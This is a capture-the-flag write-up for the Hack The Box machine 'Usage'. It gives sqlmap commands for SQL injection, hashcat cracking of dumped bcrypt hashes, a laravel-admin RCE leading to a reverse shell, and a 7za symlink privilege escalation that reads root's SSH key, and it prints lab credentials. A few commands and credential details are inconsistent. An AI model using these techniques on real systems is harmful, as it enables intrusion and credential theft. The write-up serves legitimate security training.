---
tags:
  - box
platform: HTB
os: Linux
difficulty:
date_completed:
mitre_attack: T1190, T1552.001, T1110.002, T1548.003, T1005
status: rooted
---

## Target

**IP Address:** 10.129.100.5

## Recon

```bash
sudo nmap -T5 -p- 10.129.100.5
```

![usage_initial_nmap](../../Images/Usage/usage_initial_nmap.png)

```bash
sudo nmap -sV -sC -v -p 22,80 -oA usage.tcp 10.129.100.5
```

![usage_depth_scan](../../Images/Usage/usage_depth_scan.png)

### Port 22

SSH - OpenSSH 8.9p1 Ubuntu 3ubuntu0.6

```bash
searchsploit openssh
```
*No results for this version*

### Port 80

HTTP - nginx 1.18.0, jQuery 2.1.4, Bootstrap 3.3.5, iCheck v1.0.1, AdminLTE v2.3.2

```bash
searchsploit nginx
```
*Only a DoS for this version*

Attempting to browse to the IP returned an unknown host "usage" error.

![usage_unknown_host](../../Images/Usage/usage_unknown_host.png)

```bash
sudo vim /etc/hosts
```
*Add the following line to the bottom of the file*
> 10.129.100.5 usage.htb

Navigating to the page now returns a login page.

![usage_login_page](../../Images/Usage/usage_login_page.png)

Clicking "Register" takes you to a registration page.

![usage_registration](../../Images/Usage/usage_registration.png)

## Enumeration

After registering and logging in, you're directed to a "Featured Blogs" page.

![usage_featured_blogs](../../Images/Usage/usage_featured_blogs.png)

Last blog post hints at PHP usage. Clicking "Admin" in the top right navigates to a new subdomain, `admin.usage.htb`.

![usage_admin_unknown](../../Images/Usage/usage_admin_unknown.png)

```bash
sudo vim /etc/hosts
```
*Add the following line to the end of the previously added line*
> admin.usage.htb

Navigating to the page now returns an admin login.

![usage_admin_login](../../Images/Usage/usage_admin_login.png)

Trying default creds didn't work and there were no signs of SQL injection on the admin page. Going back to the first site, found a possible SQL injection in the "forget-password" page with a single quote.

![usage_forget_password](../../Images/Usage/usage_forget_password.png)
![usage_forget_password2](../../Images/Usage/usage_forget_password2.png)
![usage_forget_password3](../../Images/Usage/usage_forget_password3.png)
![usage_forget_password4](../../Images/Usage/usage_forget_password4.png)

## Exploitation

Grabbed the forget-password POST request from Burp Suite and passed it to sqlmap.

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3
```

![usage_sqlmap_confirmed](../../Images/Usage/usage_sqlmap_confirmed.png)

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3 --tables
```

![usage_sqlmap_all_dbs](../../Images/Usage/usage_sqlmap_all_dbs.png)
![usage_sqlmap_tables](../../Images/Usage/usage_sqlmap_tables.png)

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3 -D usage_blog -T admin_users --dump
```

![usage_admin_password](../../Images/Usage/usage_admin_password.png)

```bash
echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' admin_hash
sudo hashcat -m 3200 -a 0 admin_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

![usage_cracked_admin_password](../../Images/Usage/usage_cracked_admin_password.png)

Cracked: `admin:whatever1`

![usage_admin_page](../../Images/Usage/usage_admin_page.png)

The admin panel is running `encore/laravel-admin 1.8.18` - there's an RCE for this version: https://flyd.uk/post/cve-2023-24249/

![usage_admin_settings](../../Images/Usage/usage_admin_settings.png)
![usage_admin_settings_POST_request](../../Images/Usage/usage_admin_settings_POST_request.png)
![usage_admin_settings_exploit](../../Images/Usage/usage_admin_settings_exploit.png)
![usage_reverse_shell_caught](../../Images/Usage/usage_reverse_shell_caught.png)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![usage_user_confirmation](../../Images/Usage/usage_user_confirmation.png)

```bash
uname -a
```

![usage_uname](../../Images/Usage/usage_uname.png)

```bash
./linpeas.sh
```

Found that root can log in with an SSH key but not a password - default location would be `/root/.ssh/id_rsa`.

![usage_root_ssh_permitted](../../Images/Usage/usage_root_ssh_permitted.png)

Found SQL credentials in the LinPEAS output: `staff:s3cr3t_c0d3d_1uth`

Re-ran sqlmap against the users table in case of password reuse:

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3 -D usage_blog -T users --dump
```

![usage_sqlmap_blog_users](../../Images/Usage/usage_sqlmap_blog_users.png)

```bash
echo '$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.' > userHashes
echo '$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa' >> userHashes
sudo hashcat -m 3200 -a 0 user_Hashes /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

![usage_blog_users_cracked_passwords](../../Images/Usage/usage_blog_users_cracked_passwords.png)

Tried the password for xander - didn't work. Logged in as raj instead, but there was nothing on the page besides the homepage.

```bash
netstat -antop
```

![usage_open_services](../../Images/Usage/usage_open_services.png)

Found a process called `monit` running on port 2812, and remembered seeing files named `monit`-related in dash's home directory. Reading `.monitrc` in dash's home directory revealed an admin password: `admin:3nc0d3d_pa\$$w0rd`. This worked to log in as xander: `xander:3nc0d3d_pa\$$w0rd`.

## Privilege Escalation

```bash
sudo -l
```

![usage_sudo_l_xander](../../Images/Usage/usage_sudo_l_xander.png)

As xander, can run the custom command `usage_management` as root. Using pspy, found it has 3 options, but only one really does anything:

![usage_usage_management](../../Images/Usage/usage_usage_management.png)
![usage_usage_management1](../../Images/Usage/usage_usage_management1.png)
![usage_pspy1](../../Images/Usage/usage_pspy1.png)
![usage_usage_management2](../../Images/Usage/usage_usage_management2.png)
![usage_pspy2](../../Images/Usage/usage_pspy2.png)
![usage_usage_management3](../../Images/Usage/usage_usage_management3.png)
![usage_pspy3](../../Images/Usage/usage_pspy3.png)

`mysqldump` option didn't lead anywhere, but the `7za` option had a known abuse technique on HackTricks:

![usage_hacktricks_7z](../../Images/Usage/usage_hacktricks_7z.png)

Since there should be a root SSH key somewhere, used this to read it. The `usage_management` command creates the archive from a specific directory (`/var/www/html`), so set up a symlink there ahead of time:

```bash
cd /var/www/html
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
```

![usage_7z_location](../../Images/Usage/usage_7z_location.png)

```bash
sudo usage_management (option 1)
```

![usage_sudo_usagemanagement_exploit](../../Images/Usage/usage_sudo_usagemanagement_exploit.png)
![usage_sudo_usagemanagement_exploit2](../../Images/Usage/usage_sudo_usagemanagement_exploit2.png)
![usage_root_ssh_key](../../Images/Usage/usage_root_ssh_key.png)

```bash
ssh -i root_ssh_key root@10.129.100.5
```

![usage_root_confirmation](../../Images/Usage/usage_root_confirmation.png)

## Flags

**User:** captured as xander/raj along the way above

**Root/System:** captured via SSH using the exfiltrated root SSH key

## Lessons Learned

Two separate SQLi-reachable credential leaks (admin_users table, then the users table) plus a monit config file (`.monitrc`) with a plaintext admin password chained together to get from anonymous to xander. The final privesc (`usage_management` running `7za` as root against a directory you control) is a textbook symlink-into-archive-tool trick - if a root-run tool archives/reads from a directory you can write to, a symlink pointing at a file you want to read is often enough to exfiltrate it.
